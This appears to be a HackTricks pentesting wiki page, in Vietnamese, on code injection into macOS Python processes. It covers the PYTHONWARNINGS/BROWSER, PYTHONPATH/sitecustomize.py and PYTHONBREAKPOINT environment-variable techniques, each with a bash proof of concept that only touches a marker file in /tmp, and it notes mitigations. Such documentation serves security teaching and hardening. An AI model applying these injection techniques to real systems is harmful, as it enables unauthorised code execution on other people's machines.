# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## Thông qua các biến môi trường `PYTHONWARNINGS` và `BROWSER`

Nếu kẻ tấn công có thể kiểm soát môi trường của một tiến trình Python, sự kết hợp giữa `PYTHONWARNINGS` và `BROWSER` có thể kích hoạt thực thi lệnh khi Python import module `antigravity` trong lúc xử lý một tùy chọn cảnh báo được tạo riêng. Kỹ thuật này dựa vào việc `antigravity` mở URL bằng module `webbrowser` của Python, vốn sử dụng biến môi trường `BROWSER`.<sup>[[1]](#references)</sup>

```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

## Qua `PYTHONPATH` và `sitecustomize.py`

Trong quá trình khởi động thông thường, module `site` của Python thêm các đường dẫn dành riêng cho site rồi thử import module có tên `sitecustomize`. Bằng cách đặt một thư mục mà attacker có thể đọc lên đầu `PYTHONPATH`, attacker kiểm soát môi trường của process có thể khiến Python import payload trước script mục tiêu. Cờ `-S` vô hiệu hóa việc tự động khởi tạo `site`, còn chế độ cô lập (`-I`) bỏ qua `PYTHONPATH` và ngầm bật `-s` cùng `-E`.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```

## Thông qua `PYTHONBREAKPOINT`

Từ Python 3.7 (PEP 553), hàm tích hợp `breakpoint()` nhập và gọi bất cứ thứ gì mà `sys.breakpointhook` trỏ tới; mục tiêu đó được lấy từ biến môi trường **`PYTHONBREAKPOINT`** (`package.module.callable`). Việc nhập module được chỉ định và gọi callable đều diễn ra trước khi trình gỡ lỗi thường xuất hiện, vì vậy kẻ tấn công kiểm soát môi trường của một tiến trình có gọi đến `breakpoint()` (thường gặp trong các script bảo trì/gỡ lỗi và đôi khi bị bỏ sót trong môi trường production) có thể thực thi mã.<sup>[[4]](#references)</sup>

```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```

Không giống `PYTHONWARNINGS`/`PYTHONPATH`, cách này yêu cầu mục tiêu thực sự chạy đến một lệnh gọi `breakpoint()`, nhưng cũng hoạt động hoàn toàn thông qua **các tác dụng phụ khi import** của module được chỉ định (trỏ đến bất kỳ module nào có thể import — ví dụ một module được đặt đầu tiên trên `PYTHONPATH` — mà phần mã cấp cao nhất của nó chạy code). Đặt `PYTHONBREAKPOINT=0` sẽ vô hiệu hóa hoàn toàn hook.

## References

- [1] [Hack bằng biến môi trường - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook cấu hình dành riêng cho site](https://docs.python.org/3/library/site.html)
- [3] [Python: dòng lệnh và môi trường](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — Hàm dựng sẵn breakpoint() và PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
{{#include ../../../banners/hacktricks-training.md}}
